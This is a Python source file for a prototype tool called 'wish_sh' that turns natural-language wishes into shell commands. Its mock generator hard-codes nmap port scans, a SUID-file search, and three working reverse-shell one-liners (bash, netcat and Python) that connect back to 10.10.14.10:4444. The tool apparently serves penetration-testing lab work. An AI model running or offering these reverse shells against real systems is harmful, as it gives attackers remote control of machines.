"""Command generation for wish_sh."""

from abc import ABC, abstractmethod
from typing import List


class CommandGenerator(ABC):
    """コマンド生成のための抽象基底クラス."""
    
    @abstractmethod
    def generate_commands(self, wish_text: str) -> List[str]:
        """願いテキストからコマンドを生成する.
        
        Args:
            wish_text: 願いテキスト
            
        Returns:
            生成されたコマンドのリスト
        """
        pass


class MockCommandGenerator(CommandGenerator):
    """モック実装のコマンドジェネレーター."""
    
    def generate_commands(self, wish_text: str) -> List[str]:
        """キーワードに基づいてコマンドを生成する.
        
        Args:
            wish_text: 願いテキスト
            
        Returns:
            生成されたコマンドのリスト
        """
        commands = []
        wish_lower = wish_text.lower()

        if "scan" in wish_lower and "port" in wish_lower:
            commands = [
                "sudo nmap -p- -oA tcp 10.10.10.40",
                "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
            ]
        elif "find" in wish_lower and "suid" in wish_lower:
            commands = ["find / -perm -u=s -type f 2>/dev/null"]
        elif "reverse shell" in wish_lower or "revshell" in wish_lower:
            commands = [
                "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                "nc -e /bin/bash 10.10.14.10 4444",
                "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                's.connect(("10.10.14.10",4444));'
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                'subprocess.call(["/bin/sh","-i"]);\'',
            ]
        else:
            # Default responses
            commands = [f"echo 'Executing wish: {wish_text}'", f"echo 'Processing {wish_text}' && ls -la", "sleep 5"]

        return commands


class LlmCommandGenerator(CommandGenerator):
    """LLMを使用したコマンドジェネレーター."""
    
    def __init__(self, api_key: str, model: str = "gpt-4"):
        """初期化.
        
        Args:
            api_key: LLM APIのキー
            model: 使用するモデル名
        """
        self.api_key = api_key
        self.model = model
        # LLM APIクライアントの初期化など
        
    def generate_commands(self, wish_text: str) -> List[str]:
        """LLMを使用してコマンドを生成する.
        
        Args:
            wish_text: 願いテキスト
            
        Returns:
            生成されたコマンドのリスト
        """
        # 注: 実際の実装ではLLM APIを呼び出してコマンドを生成します
        # このプロトタイプ実装では、モック実装と同じ結果を返します
        mock_generator = MockCommandGenerator()
        return mock_generator.generate_commands(wish_text)
